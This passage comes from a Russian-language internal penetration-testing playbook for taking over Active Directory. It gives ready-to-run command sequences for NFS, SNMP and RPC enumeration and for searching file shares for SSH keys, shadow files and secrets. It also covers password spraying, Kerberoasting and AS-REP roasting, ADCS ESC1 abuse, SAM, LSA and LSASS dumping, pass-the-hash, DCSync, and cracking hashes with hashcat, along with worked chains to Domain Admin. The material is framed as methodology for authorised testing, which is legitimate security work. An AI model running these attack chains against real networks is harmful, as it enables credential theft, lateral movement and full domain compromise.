    path=$(echo $export | awk '{print $2}')
    mkdir -p "/tmp/nfs/${ip}${path}"
    mount -t nfs "${ip}:${path}" "/tmp/nfs/${ip}${path}" -o nolock 2>&1
done

# Ищем интересное в NFS
find /tmp/nfs/ -type f \( -name "*.conf" -o -name "*.config" -o -name "*.xml" \
    -o -name "*.ini" -o -name "*.sh" -o -name "*.ps1" -o -name "*.bat" \
    -o -name "id_rsa" -o -name "id_ed25519" -o -name "*.kdbx" -o -name "*.key" \
    -o -name ".bash_history" -o -name "*.pgpass" -o -name ".my.cnf" \
    -o -name "shadow" -o -name "passwd" -o -name "*.bak" -o -name "*.sql" \
    -o -name "web.config" -o -name ".env" -o -name "wp-config.php" \) 2>/dev/null | tee nfs_interesting.txt

grep -rniE "password|passwd|pwd|secret|credential|key|token|api_key" /tmp/nfs/ 2>/dev/null | \
    head -100 | tee nfs_creds.txt

# === SNMP (161/udp) ===
# Нужен UDP scan (masscan или nmap)
masscan -iL scope.txt -pU:161 --rate 3000 -oL snmp_scan.txt 2>/dev/null
grep "^open" snmp_scan.txt | awk '{print $4}' > snmp_hosts.txt

# Community strings brute
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
    -i snmp_hosts.txt 2>&1 | tee snmp_communities.txt

# Если нашли community string:
for ip in $(cat snmp_hosts.txt); do
    for community in "public" "private" "manager" "community"; do
        snmpwalk -v2c -c $community $ip 1.3.6.1 2>&1 | head -5
        if [ $? -eq 0 ]; then
            echo "[+] SNMP community '$community' works on $ip"
            # Full walk
            snmpwalk -v2c -c $community $ip 1.3.6.1 2>&1 > snmp_walk_${ip}.txt &
            # Конкретно: юзеры, процессы, сетевые интерфейсы
            snmpwalk -v2c -c $community $ip 1.3.6.1.4.1.77.1.2.25 2>&1  # Windows users
            snmpwalk -v2c -c $community $ip 1.3.6.1.2.1.25.4.2.1.2 2>&1  # Running processes
            snmpwalk -v2c -c $community $ip 1.3.6.1.2.1.6.13.1.3 2>&1    # TCP connections
        fi
    done
done

# === Telnet (23) ===
for ip in $(cat telnet_hosts.txt); do
    echo "=== Telnet $ip ==="
    # Banner grab
    (echo ""; sleep 2) | telnet $ip 2>&1 | head -10
    # Часто: сетевое оборудование, принтеры, legacy systems
    # Default creds: admin/admin, cisco/cisco, admin/"", root/root
done | tee telnet_banners.txt

# === RPC (135) ===
grep " 135 " masscan_quick.txt | awk '{print $4}' | sort -u > rpc_hosts.txt
for ip in $(cat rpc_hosts.txt | head -20); do
    rpcdump.py $ip 2>&1 | head -20
done | tee rpc_endpoints.txt
# Ищем DCOM / SCCM / WSUS endpoints
PHASE 4: ЛОГИКА ПРИНЯТИЯ РЕШЕНИЙ
4.1. Flowchart: куда двигаться
text

┌─────────────────────────────────────────────────────────────┐
│                   ПОЛУЧИЛ РЕЗУЛЬТАТЫ NMAP                    │
└──────────────────────────┬──────────────────────────────────┘
                           │
    ┌──────────────────────┼──────────────────────┐
    │                      │                      │
    ▼                      ▼                      ▼
┌──────────┐     ┌──────────────┐      ┌──────────────┐
│ Legacy    │     │ AD/SMB       │      │ Web/DB/Other │
│ Windows   │     │ Infrastructure│      │ Services     │
│ found?    │     │              │      │              │
└─────┬─────┘     └──────┬───────┘      └──────┬───────┘
      │                  │                     │
      ▼                  ▼                     ▼
  MS17-010         Null session?           Jenkins/Tomcat
  BlueKeep         Guest access?           default creds?
  ────────         RID brute               MSSQL sa:''?
      │            LDAP anon?              FTP anon?
      │            ────────                NFS exports?
      │                │                   ────────
      │                ▼                       │
      │           Users list?                  │
      │                │                       │
      │          ┌─────┴──────┐               │
      │          │            │               │
      │          ▼            ▼               │
      │     AS-REP      Password              │
      │     Roast       Spray                 │
      │          │            │               │
      └──────────┴─────┬──────┴───────────────┘
                       │
                       ▼
              ┌─────────────────┐
              │  GOT FIRST      │
              │  CREDENTIALS?   │
              └────────┬────────┘
                       │
         ┌─────────────┼─────────────────┐
         │             │                 │
         ▼             ▼                 ▼
   Kerberoast    BloodHound         Check access
   → hashcat     → find path       → local admin?
                 → ACL abuse       → shares?
                 → delegation      → ADCS?
                                   → GPP?
                                   → LAPS?
                       │
                       ▼
              ┌─────────────────┐
              │  DOMAIN ADMIN   │
              └─────────────────┘
4.2. Когда переключаться
text

ПРАВИЛО: Не зависай на одном векторе больше 30-45 минут без прогресса

AD ВЕКТОР → WEB ВЕКТОР:
─────────────────────────
Переключайся если:
- Null session / guest не работает
- LDAP anonymous bind отключён
- RID brute не даёт результатов
- AS-REP roast пустой
- Spray по 5+ паролям — ничего
- Responder/mitm6 молчат 30+ минут
→ Иди в web: default creds, CVE, file upload

WEB ВЕКТОР → AD ВЕКТОР:
─────────────────────────
Переключайся если:
- Все web-сервисы за аутентификацией
- Нет известных CVE для найденных версий
- nuclei ничего не нашёл
→ Возвращайся в AD: расширяй spray wordlist, проверяй другие DC

КОГДА СТОЯТЬ НА МЕСТЕ:
──────────────────────
- Responder ловит хеши → жди, крути hashcat параллельно
- mitm6 получил auth → жди RBCD
- AS-REP нашёл хеши → крути
- Spider нашёл файлы → читай
4.3. Красные флаги тупиковых направлений
text

✗ Bruteforce на RDP при lockout=3 → СТОП
✗ SMB signing enabled на всех хостах + Responder молчит → relay не взлетит
✗ Нет ни одного юзера после всех enum → фокус на web/DB
✗ Все web за CAS/ADFS → не бей в лоб, ищи обходы
✗ Full nmap закончился, ничего нового → думай lateral, пересмотри findings
✗ Один хост ломаешь 2 часа → переключись, вернись позже
PHASE 5: БЫСТРЫЕ WIN CONDITIONS
5.1. Топ-10 путей к DA по скорости
text

#1  MITM6 + LDAP relay → RBCD → DA                    [5-15 мин, пассивно]
    Условие: IPv6 включён (почти всегда), LDAP signing off
    Результат: машинный аккаунт → RBCD → impersonate DA

#2  Responder → NTLMv2 hash → hashcat → DA creds       [5-30 мин, пассивно]
    Условие: LLMNR/NBNS не отключён, пароль слабый
    Результат: plaintext пароль (если слабый)

#3  MS17-010 → SYSTEM shell → SAM dump → reuse          [2-5 мин]
    Условие: Windows 2008/7/2003 без патча
    Результат: local admin hash → spray → DA

#4  Password in AD description → direct login            [5 мин]
    Условие: LDAP anon bind ИЛИ null session
    Результат: valid creds

#5  AS-REP Roast → crack → valid user → Kerberoast → DA [10-30 мин]
    Условие: хотя бы 1 user с DONT_REQ_PREAUTH
    Результат: TGS hash → crack → svc account → часто DA

#6  Null session → users → spray "Password1" → DA        [10-20 мин]
    Условие: null session работает, lockout >= 5
    Результат: valid creds → chain

#7  MSSQL sa:sa → xp_cmdshell → SYSTEM shell             [5-10 мин]
    Условие: MSSQL с дефолтными кредами
    Результат: SYSTEM на SQL server → SAM/credential access

#8  GPP passwords (Groups.xml) → domain creds             [2 мин]
    Условие: старый GPO с cpassword
    Результат: plaintext пароль (AES key известен)

#9  NFS с /home или /etc → SSH keys → Linux → AD creds   [10-15 мин]
    Условие: NFS exports без ограничений
    Результат: SSH доступ → .bash_history, keytabs, etc.

#10 ADCS ESC1 → cert → DA                                [10-15 мин, нужны креды]
    Условие: misconfigured cert template
    Результат: DA через certificate
5.2. После первых кредов — чек-лист эскалации
Bash

# Получили креды: $CRED_USER / $CRED_PASS

# ============================================
#  IMMEDIATE ACTIONS (первые 5 минут с кредами)
# ============================================

# 1. Kerberoasting — ПЕРВЫМ ДЕЛОМ
impacket-GetUserSPNs "$DOMAIN/$CRED_USER:$CRED_PASS" -dc-ip $DC_IP \
    -outputfile kerberoast.txt -request 2>&1
if [ -s kerberoast.txt ]; then
    echo "[!!!] KERBEROAST HASHES — CRACKING NOW"
    hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule --force -O &
fi

# 2. BloodHound — запускаем в фоне
bloodhound-python -u "$CRED_USER" -p "$CRED_PASS" -d $DOMAIN \
    -dc $DC_HOSTNAME.$DOMAIN -c all --zip -ns $DC_IP 2>&1 &
# Или
netexec ldap $DC_IP -u "$CRED_USER" -p "$CRED_PASS" \
    -M bloodhound -o COLLECTION=all,OUTPUTPREFIX=bh 2>&1 &

# 3. Проверяем local admin на всех хостах
netexec smb smb_hosts.txt -u "$CRED_USER" -p "$CRED_PASS" 2>&1 | \
    grep "Pwn3d" | tee pwned_hosts.txt

# 4. Проверяем WinRM
netexec winrm winrm_hosts.txt -u "$CRED_USER" -p "$CRED_PASS" 2>&1 | \
    grep "Pwn3d" | tee winrm_pwned.txt

# 5. ADCS vulnerable templates
certipy find -u "$CRED_USER@$DOMAIN" -p "$CRED_PASS" -dc-ip $DC_IP \
    -vulnerable -stdout 2>&1 | tee certipy_results.txt
# Если ESC1/ESC2/ESC3/ESC4/ESC6/ESC8:
grep -iE "ESC[0-9]" certipy_results.txt

# 6. Delegation
impacket-findDelegation "$DOMAIN/$CRED_USER:$CRED_PASS" -dc-ip $DC_IP 2>&1 | tee delegation.txt
# Constrained → impersonate via S4U2Self/S4U2Proxy
# Unconstrained → printerbug/coerce to unconstrained host → TGT capture

# 7. GPP passwords
impacket-Get-GPPPassword "$DOMAIN/$CRED_USER:$CRED_PASS@$DC_IP" 2>&1 | tee gpp_results.txt
netexec smb $DC_IP -u "$CRED_USER" -p "$CRED_PASS" -M gpp_password 2>&1
netexec smb $DC_IP -u "$CRED_USER" -p "$CRED_PASS" -M gpp_autologin 2>&1

# 8. LAPS
netexec ldap $DC_IP -u "$CRED_USER" -p "$CRED_PASS" -M laps 2>&1 | tee laps_results.txt
# Если читаем LAPS → local admin на хостах

# 9. Shares с кредами (больше доступа)
netexec smb smb_hosts.txt -u "$CRED_USER" -p "$CRED_PASS" --shares 2>&1 | \
    grep -E "READ|WRITE" | tee cred_shares.txt
# Spider
netexec smb smb_hosts.txt -u "$CRED_USER" -p "$CRED_PASS" -M spider_plus \
    -o DOWNLOAD_FLAG=false OUTPUT_FOLDER=./spider_cred/ 2>&1

# 10. Password policy → aggressive spray
netexec smb $DC_IP -u "$CRED_USER" -p "$CRED_PASS" --pass-pol 2>&1 | tee pass_policy_full.txt

# 11. Все доменные юзеры
netexec ldap $DC_IP -u "$CRED_USER" -p "$CRED_PASS" --users 2>&1 | tee all_domain_users.txt
# Парсим для spray
awk '{print $5}' all_domain_users.txt | grep -v "^\s*$" | sort -u > full_user_list.txt

# 12. Пароли в description (с кредами видим всех)
netexec ldap $DC_IP -u "$CRED_USER" -p "$CRED_PASS" \
    -M get-desc-users 2>&1 | tee descriptions.txt
grep -iE "pass|pwd|пароль|cred|secret|temp|logon" descriptions.txt

# 13. noPac / sAMAccountName spoofing
netexec smb $DC_IP -u "$CRED_USER" -p "$CRED_PASS" -M nopac 2>&1

# 14. PrintNightmare
netexec smb smb_hosts.txt -u "$CRED_USER" -p "$CRED_PASS" -M printnightmare 2>&1

# 15. MSSQL с доменными кредами
netexec mssql db_hosts.txt -u "$CRED_USER" -p "$CRED_PASS" -d $DOMAIN 2>&1 | tee mssql_domain_auth.txt
# Если sysadmin → xp_cmdshell
5.3. Если получили local admin на хосте
Bash

TARGET_IP="10.10.10.X"

# Dump SAM + LSA + DPAPI
netexec smb $TARGET_IP -u "$CRED_USER" -p "$CRED_PASS" --sam 2>&1 | tee sam_dump.txt
netexec smb $TARGET_IP -u "$CRED_USER" -p "$CRED_PASS" --lsa 2>&1 | tee lsa_dump.txt
netexec smb $TARGET_IP -u "$CRED_USER" -p "$CRED_PASS" --dpapi 2>&1 | tee dpapi_dump.txt

# Dump LSASS (осторожно — AV может блокировать)
netexec smb $TARGET_IP -u "$CRED_USER" -p "$CRED_PASS" -M lsassy 2>&1 | tee lsassy_dump.txt
netexec smb $TARGET_IP -u "$CRED_USER" -p "$CRED_PASS" -M nanodump 2>&1 | tee nanodump.txt
netexec smb $TARGET_IP -u "$CRED_USER" -p "$CRED_PASS" -M handlekatz 2>&1

# Logged on users / sessions
netexec smb $TARGET_IP -u "$CRED_USER" -p "$CRED_PASS" --loggedon-users 2>&1

# Если нашли NTLM hash DA → game over
grep -iE "administrator|domain admin" sam_dump.txt lsa_dump.txt lsassy_dump.txt 2>/dev/null

# Pass-the-hash с найденными хешами
FOUND_HASH="aad3b435...:abcdef..."
netexec smb smb_hosts.txt -u "Administrator" -H "$FOUND_HASH" 2>&1 | grep "Pwn3d"
netexec smb $DC_IP -u "Administrator" -H "$FOUND_HASH" 2>&1 | grep "Pwn3d"
# Если Pwn3d на DC → DCSync
impacket-secretsdump "$DOMAIN/Administrator@$DC_IP" -hashes "$FOUND_HASH" 2>&1 | tee dcsync.txt
PHASE 6: РЕАЛЬНЫЕ КЕЙСЫ (ЧАСТЫЕ WINS)
Кейс 1: Relay Chain
text

1. Responder поймал NTLMv2 hash от user1 (через LLMNR poisoning)
2. hashcat -m 5600 → пароль "Company2024!"
3. Проверяем shares → SYSVOL/script.bat содержит пароль svc_backup
4. svc_backup → member of Backup Operators
5. Backup Operators → SAM/SYSTEM dump с DC через reg save
6. → DA hash → DCSync
Время: 25 минут
Кейс 2: mitm6 → DA за 10 минут
text

1. mitm6 отравляет DHCPv6
2. Machine account DESKTOP-ABC$ аутентифицируется на наш relay
3. ntlmrelayx создаёт computer account FAKEMACHINE$
4. RBCD: FAKEMACHINE$ → impersonate Administrator на DESKTOP-ABC$
5. secretsdump на DESKTOP-ABC$ → cached DA creds
6. → DA
Время: 10-15 минут
Кейс 3: ADCS ESC1
text

1. Spray: user1:Password1
2. certipy find → ESC1 на шаблоне "User"
3. certipy req -u user1 -p Password1 -target ca.corp.local -template User -upn administrator@corp.local
4. certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
5. → DA NT hash → DCSync
Время: 15 минут после получения кредов
Кейс 4: NFS → SSH → AD
text

1. showmount -e 10.10.10.50 → /home (everyone)
2. mount → /home/admin/.ssh/id_rsa
3. SSH на 10.10.10.50 как admin
4. cat /etc/krb5.keytab → machine account hash
5. → LDAP query → кредов в description
6. → spray → local admin → LSASS dump → DA
Время: 20 минут
Кейс 5: Password in description
text

1. ldapsearch anonymous bind → 500 users
2. grep "description:" → "Temp password: Welcome2024!"
3. user svc_sql → Kerberoast → TGS hash
4. hashcat → another svc password
5. svc account → local admin → chain → DA
Время: 15 минут
PHASE 7: MASTER CHECKLIST
text

╔═══════════════════════════════════════════════════════════╗
║              INTERNAL PENTEST — HOUR 1 CHECKLIST          ║
╠═══════════════════════════════════════════════════════════╣
║                                                           ║
║  [T=0min] ЗАПУСК ПАРАЛЛЕЛЬНЫХ ПРОЦЕССОВ                   ║
║  ────────────────────────────────────────                  ║
║  □ Responder -I eth0 ...                                  ║
║  □ mitm6 + ntlmrelayx                                     ║
║  □ masscan quick ports                                    ║
║  □ nmap top-100                                           ║
║  □ nmap full (background)                                 ║
║  □ Network recon (IP, DNS, DC)                            ║
║                                                           ║
║  [T=3min] ПОСЛЕ MASSCAN                                  ║
║  ─────────────────────                                    ║
║  □ Парсинг в категории (smb/rdp/web/db/etc)              ║
║  □ SMB signing check → relay_targets.txt                  ║
║  □ Null session / Guest на SMB                            ║
║  □ RID brute                                              ║
║  □ LDAP anonymous bind                                    ║
║  □ enum4linux-ng (background)                             ║
║  □ MS17-010 check на legacy                               ║
║  □ ZeroLogon check                                        ║
║  □ PetitPotam check                                       ║
║  □ MSSQL default creds                                    ║
║  □ FTP anonymous                                          ║
║  □ NFS exports                                            ║
║                                                           ║
║  [T=10min] ПОСЛЕ ПОЛУЧЕНИЯ СПИСКА ЮЗЕРОВ                 ║
║  ──────────────────────────────────────                    ║
║  □ AS-REP Roasting                                        ║
║  □ Password spray (username=password)                     ║
║  □ Password spray (сезонные/типичные)                     ║
║  □ Kerbrute enum (если нет юзеров)                        ║
║                                                           ║
║  [T=15min] ПОСЛЕ NMAP TOP-100                             ║
║  ─────────────────────────────                             ║
║  □ Анализ nmap output (legacy, versions, rare ports)      ║
║  □ Web fingerprinting (httpx/nuclei)                      ║
║  □ Default creds на web (Jenkins/Tomcat/etc)              ║
║  □ Скриншоты (gowitness/eyewitness)                       ║
║  □ SNMP community brute                                   ║
║  □ Telnet banners                                         ║
║  □ Redis/MongoDB/Elastic без auth                         ║
║  □ IPMI check                                             ║
║                                                           ║
║  [T=30min] ПОСЛЕ ПОЛУЧЕНИЯ ПЕРВЫХ КРЕДОВ                  ║
║  ─────────────────────────────────────                     ║
║  □ Kerberoasting                                          ║
║  □ BloodHound collection                                  ║
║  □ Check local admin on all hosts                         ║
║  □ ADCS enumeration (certipy)                             ║
║  □ Delegation check                                       ║
║  □ GPP passwords                                          ║
║  □ LAPS read                                              ║
║  □ Shares spider with creds                               ║
║  □ MSSQL with domain creds                                ║
║  □ noPac check                                            ║
║  □ PrintNightmare check                                   ║
║  □ Description passwords (all users)                      ║
║  □ Aggressive spray with known policy                     ║
║                                                           ║
║  [T=45min] ЕСЛИ ПОЛУЧИЛИ LOCAL ADMIN                      ║
║  ─────────────────────────────────                         ║
║  □ SAM dump                                               ║
║  □ LSA dump                                               ║
║  □ LSASS dump (lsassy/nanodump/handlekatz)                ║
║  □ DPAPI                                                  ║
║  □ Pass-the-hash spray                                    ║
║  □ Lateral movement → repeat                              ║
║                                                           ║
║  [CONTINUOUS] ВСЁ ВРЕМЯ                                   ║
║  ──────────────────────                                    ║
║  □ Мониторь Responder (новые хеши → hashcat)              ║
║  □ Мониторь mitm6/ntlmrelayx (auth events)               ║
║  □ hashcat на все полученные хеши                          ║
║  □ Проверяй spray results                                 ║
║  □ Обновляй списки: users, creds, hosts                   ║
║                                                           ║
╠═══════════════════════════════════════════════════════════╣
║  DA ПОЛУЧЕН:                                              ║
║  □ DCSync (impacket-secretsdump)                          ║
║  □ Дамп NTDS.dit                                          ║
║  □ Golden ticket (для persistence в отчёте)               ║
║  □ Документируй chain of compromise                       ║
╚═══════════════════════════════════════════════════════════╝
ДОПОЛНЕНИЯ / TIPS
Hashcat — правильные режимы
Bash

# NTLMv2 (Responder)
hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule --force -O

# NTLMv1 (если --lm в Responder)
hashcat -m 5500 hashes.txt wordlist.txt --force -O
# Или crack.sh для rainbow tables (NTLMv1 = instant crack)

# AS-REP
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule --force -O

# Kerberoast (TGS-REP etype 23)
hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule --force -O

# Kerberoast (TGS-REP etype 17/18 — AES)
hashcat -m 19600 kerberoast_aes128.txt wordlist.txt --force  # etype 17
hashcat -m 19700 kerberoast_aes256.txt wordlist.txt --force  # etype 18

# NetNTLMv1 → отправляй на https://crack.sh (бесплатно, rainbow tables)
# Для этого используй --lm и --disable-ess в Responder

# DPAPI masterkey
hashcat -m 15900 dpapi.txt wordlist.txt --force

# Local NTLM hash (SAM dump)
hashcat -m 1000 ntlm.txt wordlist.txt -r rules/best64.rule --force -O
Организация рабочего пространства
Bash

# Структура проекта
mkdir -p ~/pentest/{scans,creds,loot,tools,notes,bloodhound}
cd ~/pentest

# Логируй ВСЁ
script -a ~/pentest/notes/terminal_$(date +%Y%m%d_%H%M%S).log

# tmux layout для пентеста
# Window 1: Responder + mitm6
# Window 2: Scans (nmap, masscan)
# Window 3: AD attacks (netexec, impacket)
# Window 4: Web attacks
# Window 5: hashcat
# Window 6: Notes / creds tracking

# Трекинг кредов (обновляй постоянно)
echo "user:password:source:access_level" > ~/pentest/creds/creds_master.csv
# Пример:
# svc_sql:Summer2024!:spray:domain_user
# Administrator:aad3b435...:31d6cfe...:sam_dump_HOST01:local_admin